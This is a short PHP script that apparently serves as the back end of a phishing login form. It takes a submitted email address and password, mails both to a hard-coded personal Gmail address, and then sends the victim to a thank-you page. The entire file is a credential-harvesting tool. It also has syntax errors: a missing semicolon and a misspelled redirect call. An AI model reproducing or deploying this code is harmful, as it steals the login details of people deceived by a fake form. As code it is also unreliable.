<?php
//get data from form
$email = $_POST['email'];
$password = $_POST['password'];
$to = "grafogiorgi777@gmail.com";
$subject = "mail from website";
$txt = "email = ".$email ."\r\n password = ".$password;
$headers = "from no-reply"
if ($email!=NULL){mail($to,$subject,$txt,$headers);}
headers("Location:thankyou.html");

?>